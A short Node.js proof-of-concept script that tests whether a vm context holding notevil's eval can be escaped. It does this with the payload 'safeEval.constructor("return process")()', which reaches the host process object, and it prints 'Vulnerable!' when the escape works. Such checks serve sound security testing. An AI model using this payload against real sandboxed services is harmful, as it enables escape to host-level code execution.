const vm = require('vm');
const notevil = require('notevil');
const sandbox = Object.create(null);
sandbox.safeEval = notevil.eval;
sandbox.orderLinesData = 'safeEval.constructor("return process")()';
vm.createContext(sandbox);
try {
  let res = vm.runInContext('safeEval.constructor("return process")()', sandbox);
  console.log('Vulnerable!', res.version);
} catch (e) {
  console.log('Error:', e.message);
}
